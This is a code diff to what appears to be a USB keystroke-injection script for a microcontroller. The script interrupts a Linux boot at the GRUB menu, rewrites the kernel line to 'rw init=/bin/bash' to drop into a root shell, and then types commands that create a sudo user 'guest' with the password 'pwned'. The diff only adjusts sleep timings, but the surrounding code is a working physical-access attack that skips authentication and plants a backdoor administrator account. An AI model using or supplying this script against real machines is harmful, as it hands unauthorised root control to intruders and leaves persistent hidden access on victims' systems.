@@ -13,7 +13,7 @@ layout = KeyboardLayoutUS(kbd)
 kbd.send(Keycode.E) # For enter grub menu i use E for it you need configure if it need.
 
 
-time.sleep(5) # Wait until the GRUB menu appears if your pc more slow maybe chance value for it.
+time.sleep(8) # Wait until the GRUB menu appears if your pc more slow maybe chance value for it.
 
 # I locate for  "ro  quiet splash" and replace "rw init=/bin/bash"
 #  if you dont know actualy where is it you can make a code just press E and check where is ro quiet splash
@@ -50,8 +50,8 @@ time.sleep(0.5)
 kbd.send(Keycode.F10)
 # HERE for enter root terminal and in the below code create sudo user call guest and guest's password is pwned
 time.sleep(20)
-time.sleep(0.05)
 kbd.send(Keycode.ENTER)
+time.sleep(0.05)
 layout.write("useradd guest")
 time.sleep(0.05)
 kbd.send(Keycode.ENTER)
